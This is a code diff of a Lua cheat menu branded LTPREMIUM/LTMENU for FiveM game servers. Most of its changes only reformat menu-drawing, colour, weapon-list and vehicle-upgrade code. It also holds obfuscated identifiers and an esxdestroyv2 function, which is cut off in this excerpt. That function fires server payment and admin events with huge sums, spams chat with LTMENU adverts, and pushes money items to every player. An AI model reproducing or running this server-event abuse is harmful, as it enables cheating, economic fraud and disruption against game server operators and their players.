+    "WEAPON_SPECIALCARBINE",
+    "WEAPON_BULLPUPRIFLE",
+    "WEAPON_COMPACTRIFLE",
+    "WEAPON_PUMPSHOTGUN",
+    "WEAPON_SAWNOFFSHOTGUN",
+    "WEAPON_BULLPUPSHOTGUN",
+    "WEAPON_ASSAULTSHOTGUN",
+    "WEAPON_MUSKET",
+    "WEAPON_HEAVYSHOTGUN",
+    "WEAPON_DBSHOTGUN",
+    "WEAPON_SNIPERRIFLE",
+    "WEAPON_HEAVYSNIPER",
+    "WEAPON_HEAVYSNIPER_MK2",
+    "WEAPON_MARKSMANRIFLE",
+    "WEAPON_GRENADELAUNCHER",
+    "WEAPON_GRENADELAUNCHER_SMOKE",
+    "WEAPON_RPG",
+    "WEAPON_STINGER",
+    "WEAPON_FIREWORK",
+    "WEAPON_HOMINGLAUNCHER",
+    "WEAPON_GRENADE",
+    "WEAPON_STICKYBOMB",
+    "WEAPON_PROXMINE",
+    "WEAPON_BZGAS",
+    "WEAPON_SMOKEGRENADE",
+    "WEAPON_MOLOTOV",
+    "WEAPON_FIREEXTINGUISHER",
+    "WEAPON_PETROLCAN",
+    "WEAPON_SNOWBALL",
+    "WEAPON_FLARE",
+    "WEAPON_BALL",
+    "WEAPON_MINIGUN"
 }
 
 local function debugPrint(text)
     if LTPREMIUM.debug then
-        Citizen.Trace("[Plane] "..tostring(text))
+        Citizen.Trace("[Plane] " .. tostring(text))
     end
 end
 
@@ -2139,13 +2222,13 @@ end
 local function setMenuProperty(id, property, value)
     if id and menus[id] then
         menus[id][property] = value
-        debugPrint(id.." menu property changed: { "..tostring(property)..", "..tostring(value).." }")
+        debugPrint(id .. " menu property changed: { " .. tostring(property) .. ", " .. tostring(value) .. " }")
     end
 end
 
-    function LTPREMIUM.SetSpriteColor(id, r, g, b, a)
-        setMenuProperty(id, 'spriteColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuBackgroundColor.a })
-    end
+function LTPREMIUM.SetSpriteColor(id, r, g, b, a)
+    setMenuProperty(id, 'spriteColor', { ['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuBackgroundColor.a })
+end
 
 local function isMenuVisible(id)
     if id and menus[id] then
@@ -2386,12 +2469,14 @@ local function drawTitle()
         local y = menus[currentMenu].y + titleHeight / 2
 
         if menus[currentMenu].titleBackgroundSprite then
-            DrawSprite(menus[currentMenu].titleBackgroundSprite.dict, menus[currentMenu].titleBackgroundSprite.name, x, y, menus[currentMenu].width, titleHeight, 0., 255, 255, 255, 255)
+            DrawSprite(menus[currentMenu].titleBackgroundSprite.dict, menus[currentMenu].titleBackgroundSprite.name, x, y,
+                menus[currentMenu].width, titleHeight, 0., 255, 255, 255, 255)
         else
             drawRect(x, y, menus[currentMenu].width, titleHeight, menus[currentMenu].titleBackgroundColor)
         end
 
-        drawText(menus[currentMenu].title, x, y - titleHeight / 2 + titleYOffset, menus[currentMenu].titleFont, menus[currentMenu].titleColor, titleScale, true)
+        drawText(menus[currentMenu].title, x, y - titleHeight / 2 + titleYOffset, menus[currentMenu].titleFont,
+            menus[currentMenu].titleColor, titleScale, true)
     end
 end
 
@@ -2404,10 +2489,13 @@ local function drawSubTitle()
         local subTitleColor = { r = 255, g = 255, b = 255, a = 0 }
 
         drawRect(x, y, menus[currentMenu].width, buttonHeight, menus[currentMenu].subTitleBackgroundColor)
-        drawText(menus[currentMenu].subTitle, menus[currentMenu].x + buttonTextXOffset, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTitleColor, buttonScale, false)
+        drawText(menus[currentMenu].subTitle, menus[currentMenu].x + buttonTextXOffset,
+            y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTitleColor, buttonScale, false)
 
         if optionCount > menus[currentMenu].maxOptionCount then
-            drawText(tostring(menus[currentMenu].currentOption).." / "..tostring(optionCount), menus[currentMenu].x + menus[currentMenu].width, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTitleColor, buttonScale, false, false, true)
+            drawText(tostring(menus[currentMenu].currentOption) .. " / " .. tostring(optionCount),
+                menus[currentMenu].x + menus[currentMenu].width, y - buttonHeight / 2 + buttonTextYOffset, buttonFont,
+                subTitleColor, buttonScale, false, false, true)
         end
     end
 end
@@ -2442,17 +2530,19 @@ local function drawButton(text, subText)
         end
 
         drawRect(x, y, menus[currentMenu].width, buttonHeight, backgroundColor)
-        drawText(text, menus[currentMenu].x + buttonTextXOffset, y - (buttonHeight / 2) + buttonTextYOffset, buttonFont, textColor, buttonScale, false, shadow)
+        drawText(text, menus[currentMenu].x + buttonTextXOffset, y - (buttonHeight / 2) + buttonTextYOffset, buttonFont,
+            textColor, buttonScale, false, shadow)
 
         if subText then
-            drawText(subText, menus[currentMenu].x + buttonTextXOffset, y - buttonHeight / 2 + buttonTextYOffset, buttonFont, subTextColor, buttonScale, false, shadow, true)
+            drawText(subText, menus[currentMenu].x + buttonTextXOffset, y - buttonHeight / 2 + buttonTextYOffset,
+                buttonFont, subTextColor, buttonScale, false, shadow, true)
         end
     end
 end
 
 
 function LTPREMIUM.CreateMenu(id, title)
-    menus[id] = { }
+    menus[id] = {}
     menus[id].title = title
 
     menus[id].visible = false
@@ -2470,16 +2560,16 @@ function LTPREMIUM.CreateMenu(id, title)
 
     -- Заглавие на менюто
     menus[id].titleFont = 1
-    menus[id].titleColor = { r = 200, g = 200, b = 200, a = 255 } -- Светло сиво
+    menus[id].titleColor = { r = 200, g = 200, b = 200, a = 255 }        -- Светло сиво
     menus[id].titleBackgroundColor = { r = 50, g = 50, b = 50, a = 200 } -- Тъмно сиво
     menus[id].titleBackgroundSprite = nil
 
     -- Текст и акценти на менюто
-    menus[id].menuTextColor = { r = 180, g = 180, b = 180, a = 255 } -- Светло сиво
-    menus[id].menuSubTextColor = { r = 150, g = 150, b = 150, a = 255 } -- Малко по-тъмно сиво
-    menus[id].menuFocusTextColor = { r = 220, g = 220, b = 220, a = 255 } -- Почти бяло
+    menus[id].menuTextColor = { r = 180, g = 180, b = 180, a = 255 }         -- Светло сиво
+    menus[id].menuSubTextColor = { r = 150, g = 150, b = 150, a = 255 }      -- Малко по-тъмно сиво
+    menus[id].menuFocusTextColor = { r = 220, g = 220, b = 220, a = 255 }    -- Почти бяло
     menus[id].menuFocusBackgroundColor = { r = 80, g = 80, b = 80, a = 200 } -- Тъмно сиво с прозрачен ефект
-    menus[id].menuBackgroundColor = { r = 40, g = 40, b = 40, a = 230 } -- Тъмно сиво за фона
+    menus[id].menuBackgroundColor = { r = 40, g = 40, b = 40, a = 230 }      -- Тъмно сиво за фона
 
     -- Фон на подзаглавията
     menus[id].subTitleBackgroundColor = { r = 60, g = 60, b = 60, a = 200 } -- Средно сиво за подзаглавията
@@ -2489,9 +2579,8 @@ function LTPREMIUM.CreateMenu(id, title)
 
     menus[id].buttonPressedSound = { name = "SELECT", set = "HUD_FRONTEND_DEFAULT_SOUNDSET" }
 
-    debugPrint(tostring(id).." menu created")
+    debugPrint(tostring(id) .. " menu created")
 end
-
 
 function LTPREMIUM.CreateSubMenu(id, parent, subTitle)
     if menus[parent] then
@@ -2519,35 +2608,32 @@ function LTPREMIUM.CreateSubMenu(id, parent, subTitle)
         setMenuProperty(id, "menuBackgroundColor", menus[parent].menuBackgroundColor)
         setMenuProperty(id, "subTitleBackgroundColor", menus[parent].subTitleBackgroundColor)
     else
-        debugPrint("Failed to create "..tostring(id).." submenu: "..tostring(parent).." parent menu doesn\"t exist")
+        debugPrint("Failed to create " .. tostring(id) .. " submenu: " .. tostring(parent) ..
+        " parent menu doesn\"t exist")
     end
 end
-
 
 function LTPREMIUM.CurrentMenu()
     return currentMenu
 end
 
-
 function trynaskidhuh(id)
     if id and menus[id] then
         PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
         setMenuVisible(id, true)
-        debugPrint(tostring(id).." menu opened")
+        debugPrint(tostring(id) .. " menu opened")
     else
-        debugPrint("Failed to open "..tostring(id).." menu: it doesn\"t exist")
+        debugPrint("Failed to open " .. tostring(id) .. " menu: it doesn\"t exist")
     end
 end
-
 
 function LTPREMIUM.IsMenuOpened(id)
     return isMenuVisible(id)
 end
 
-
 Citizen.CreateThread(function()
     while true do
-        Citizen.Wait(-1000) -- Постоянно обновява менюто, за да избегне премигване
+        Citizen.Wait(-1000)                 -- Постоянно обновява менюто, за да избегне премигване
         if LTPREMIUM.IsAnyMenuOpened() then -- Проверява дали някое меню е активно
             LTPREMIUM.Display()
         end
@@ -2563,29 +2649,27 @@ function LTPREMIUM.IsMenuAboutToBeClosed()
     end
 end
 
-
 function LTPREMIUM.CloseMenu()
     if menus[currentMenu] then
         if menus[currentMenu].aboutToBeClosed then
             menus[currentMenu].aboutToBeClosed = false
             setMenuVisible(currentMenu, false)
-            debugPrint(tostring(currentMenu).." menu closed")
+            debugPrint(tostring(currentMenu) .. " menu closed")
             PlaySoundFrontend(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
             optionCount = 0
             currentMenu = nil
             currentKey = nil
         else
             menus[currentMenu].aboutToBeClosed = true
-            debugPrint(tostring(currentMenu).." menu about to be closed")
+            debugPrint(tostring(currentMenu) .. " menu about to be closed")
         end
     end
 end
 
-
 function LTPREMIUM.Button(text, subText)
     local buttonText = text
     if subText then
-        buttonText = "{ "..tostring(buttonText)..", "..tostring(subText).." }"
+        buttonText = "{ " .. tostring(buttonText) .. ", " .. tostring(subText) .. " }"
     end
 
     if menus[currentMenu] then
@@ -2597,8 +2681,9 @@ function LTPREMIUM.Button(text, subText)
 
         if isCurrent then
             if currentKey == keys.select then
-                PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
-                debugPrint(buttonText.." button pressed")
+                PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name,
+                    menus[currentMenu].buttonPressedSound.set, true)
+                debugPrint(buttonText .. " button pressed")
                 return true
             elseif currentKey == keys.left or currentKey == keys.right then
                 PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
@@ -2607,12 +2692,11 @@ function LTPREMIUM.Button(text, subText)
 
         return false
     else
-        debugPrint("Failed to create "..buttonText.." button: "..tostring(currentMenu).." menu doesn\"t exist")
+        debugPrint("Failed to create " .. buttonText .. " button: " .. tostring(currentMenu) .. " menu doesn\"t exist")
 
         return false
     end
 end
-
 
 function LTPREMIUM.MenuButton(text, id)
     if menus[id] then
@@ -2623,7 +2707,7 @@ function LTPREMIUM.MenuButton(text, id)
             return true
         end
     else
-        debugPrint("Failed to create "..tostring(text).." menu button: "..tostring(id).." submenu doesn\"t exist")
+        debugPrint("Failed to create " .. tostring(text) .. " menu button: " .. tostring(id) .. " submenu doesn\"t exist")
     end
 
     return false
@@ -2655,7 +2739,7 @@ local bm = {
 function LTPREMIUM.CheckBox(text, checked, callback)
     if LTPREMIUM.Button(text, checked and "~g~~h~On" or "~h~~c~Off") then
         checked = not checked
-        debugPrint(tostring(text).." checkbox changed to "..tostring(checked))
+        debugPrint(tostring(text) .. " checkbox changed to " .. tostring(checked))
         if callback then callback(checked) end
 
         return true
@@ -2664,14 +2748,13 @@ function LTPREMIUM.CheckBox(text, checked, callback)
     return false
 end
 
-
 function LTPREMIUM.ComboBox(text, items, currentIndex, selectedIndex, callback)
     local itemsCount = #items
     local selectedItem = items[currentIndex]
     local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)
 
     if itemsCount > 1 and isCurrent then
-        selectedItem = "← "..tostring(selectedItem).." →"
+        selectedItem = "← " .. tostring(selectedItem) .. " →"
     end
 
     if LTPREMIUM.Button(text, selectedItem) then
@@ -2740,70 +2823,61 @@ function LTPREMIUM.Display()
     end
 end
 
-
 function LTPREMIUM.SetMenuWidth(id, width)
     setMenuProperty(id, "width", width)
 end
-
 
 function LTPREMIUM.SetMenuX(id, x)
     setMenuProperty(id, "x", x)
 end
 
-
 function LTPREMIUM.SetMenuY(id, y)
     setMenuProperty(id, "y", y)
 end
-
 
 function LTPREMIUM.SetMenuMaxOptionCountOnScreen(id, count)
     setMenuProperty(id, "maxOptionCount", count)
 end
 
-
 function LTPREMIUM.SetTitle(id, title)
     setMenuProperty(id, "title", title)
 end
-
 
 function LTPREMIUM.SetTitleColor(id, r, g, b, a)
     setMenuProperty(id, "titleColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleColor.a })
 end
 
-
 function LTPREMIUM.SetTitleBackgroundColor(id, r, g, b, a)
-    setMenuProperty(id, "titleBackgroundColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleBackgroundColor.a })
+    setMenuProperty(id, "titleBackgroundColor",
+        { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleBackgroundColor.a })
 end
-
 
 function LTPREMIUM.SetTitleBackgroundSprite(id, textureDict, textureName)
     RequestStreamedTextureDict(textureDict)
     setMenuProperty(id, "titleBackgroundSprite", { dict = textureDict, name = textureName })
 end
 
-
 function LTPREMIUM.SetSubTitle(id, text)
     setMenuProperty(id, "subTitle", string.upper(text))
 end
 
-
 function LTPREMIUM.SetMenuBackgroundColor(id, r, g, b, a)
-    setMenuProperty(id, "menuBackgroundColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuBackgroundColor.a })
+    setMenuProperty(id, "menuBackgroundColor",
+        { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuBackgroundColor.a })
 end
-
 
 function LTPREMIUM.SetMenuTextColor(id, r, g, b, a)
     setMenuProperty(id, "menuTextColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuTextColor.a })
 end
 
 function LTPREMIUM.SetMenuSubTextColor(id, r, g, b, a)
-    setMenuProperty(id, "menuSubTextColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuSubTextColor.a })
+    setMenuProperty(id, "menuSubTextColor",
+        { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuSubTextColor.a })
 end
 
 function LTPREMIUM.SetMenuFocusColor(id, r, g, b, a)
     setMenuProperty(id, "menuFocusColor", { ["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuFocusColor.a })
 end
-
 
 function LTPREMIUM.SetMenuButtonPressedSound(id, name, set)
     setMenuProperty(id, "buttonPressedSound", { ["name"] = name, ["set"] = set })
@@ -2815,26 +2889,27 @@ function drawNotification(text)
     DrawNotification(false, false)
 end
 
-
 function getEntity(player)
     local result, entity = GetEntityPlayerIsFreeAimingAt(player, Citizen.ReturnResultAnyway())
     return entity
 end
 
-local function bf(u,kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc,riNXBfISndxkHbIUAdmpVnQHstshQu48y34ELCNkcesVCDvoiVxmVwprvl)
+local function bf(u, kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc,
+                  riNXBfISndxkHbIUAdmpVnQHstshQu48y34ELCNkcesVCDvoiVxmVwprvl)
     SetTextFont(0)
     SetTextProportional(1)
-    SetTextScale(0.0,0.4)
-    SetTextDropshadow(1,0,0,0,255)
-    SetTextEdge(1,0,0,0,255)
+    SetTextScale(0.0, 0.4)
+    SetTextDropshadow(1, 0, 0, 0, 255)
+    SetTextEdge(1, 0, 0, 0, 255)
     SetTextDropShadow()
     SetTextOutline()
     SetTextEntry("STRING")
     AddTextComponentString(u)
-    DrawText(kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc,riNXBfISndxkHbIUAdmpVnQHstshQu48y34ELCNkcesVCDvoiVxmVwprvl)
- end
+    DrawText(kedtnyTylyxIBQelrCkvqcErxJSgyiqKheFarAEkWVPLbNAOWUgoFc,
+        riNXBfISndxkHbIUAdmpVnQHstshQu48y34ELCNkcesVCDvoiVxmVwprvl)
+end
 
- local bn = {
+local bn = {
     {
         name = "~h~Blue on White 2",
         id = 0
@@ -3365,28 +3440,44 @@ local bu = {
         id = 159
     }
 }
- 
+
 
 function MaxOut(veh)
     SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
     SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7)
-    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) - 1, false)
-    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) - 1, false)
-    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2) - 1, false)
-    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3) - 1, false)
-    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4) - 1, false)
-    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) - 1, false)
-    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6) - 1, false)
-    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) - 1, false)
-    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8) - 1, false)
-    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9) - 1, false)
-    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10) - 1, false)
-    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
-    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
-    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0,
+        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1,
+        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2,
+        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3,
+        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4,
+        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5,
+        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6,
+        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7,
+        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8,
+        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9,
+        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10,
+        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11,
+        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12,
+        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13,
+        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
     SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 14, 16, false)
-    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
-    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15,
+        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16,
+        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
     ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
     ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
     ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
@@ -3395,14 +3486,22 @@ function MaxOut(veh)
     ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 22, true)
     SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 23, 1, false)
     SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 24, 1, false)
-    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25) - 1, false)
-    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27) - 1, false)
-    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28) - 1, false)
-    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30) - 1, false)
-    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33) - 1, false)
-    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34) - 1, false)
-    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35) - 1, false)
-    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38) - 1, true)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25,
+        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27,
+        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28,
+        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30,
+        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33,
+        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34,
+        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35,
+        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38,
+        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38) - 1, true)
     SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1)
     SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
     SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5)
@@ -3410,11 +3509,16 @@ end
 
 function MaxOutPerf(veh)
     SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
-    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
-    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
-    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
-    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
-    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11,
+        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12,
+        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13,
+        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15,
+        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
+    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16,
+        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
     ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
     ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
     ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
@@ -3453,73 +3557,73 @@ cappA = 'd' .. 'o' .. 'k' .. 'i' .. capPa
 local bD = cappA
 
 function esxdestroyv2()
-                Citizen.CreateThread(
-                    function()
-                        TriggerServerEvent('esx_jobs:caution', 'give_back', 9999999999)
-                        TriggerServerEvent('esx_fueldelivery:pay', 9999999999)
-                        TriggerServerEvent('esx_carthief:pay', 9999999999)
-                        TriggerServerEvent('esx_godirtyjob:pay', 9999999999)
-                        TriggerServerEvent('esx_pizza:pay', 9999999999)
-                        TriggerServerEvent('esx_ranger:pay', 9999999999)
-                        TriggerServerEvent('esx_garbagejob:pay', 9999999999)
-                        TriggerServerEvent('esx_truckerjob:pay', 9999999999)
-                        TriggerServerEvent('AdminMenu:giveBank', 9999999999)
-                        TriggerServerEvent('AdminMenu:giveCash', 9999999999)
-                        TriggerServerEvent('esx_gopostaljob:pay', 9999999999)
-                        TriggerServerEvent('esx_banksecurity:pay', 9999999999)
-                        TriggerServerEvent('esx_slotmachine:sv:2', 9999999999)
-                        for bD = 0, 9 do
-                            TriggerServerEvent(
-                                '_chat:messageEntered',
-                                '~g~LTMENU#7799',
-                                {
-                                    141,
-                                    211,
-                                    255
-                                },
-                                '^' .. bD .. '~b~LTMENU'
-                            )
-                        end
-                        for i = 0, 256 do
-                            TriggerServerEvent(
-                                'esx:giveInventoryItem',
-                                GetPlayerServerId(i),
-                                'item_money',
-                                'money',
-                                1254756
-                            )
-                            TriggerServerEvent(
-                                'esx:giveInventoryItem',
-                                GetPlayerServerId(i),
-                                'item_money',
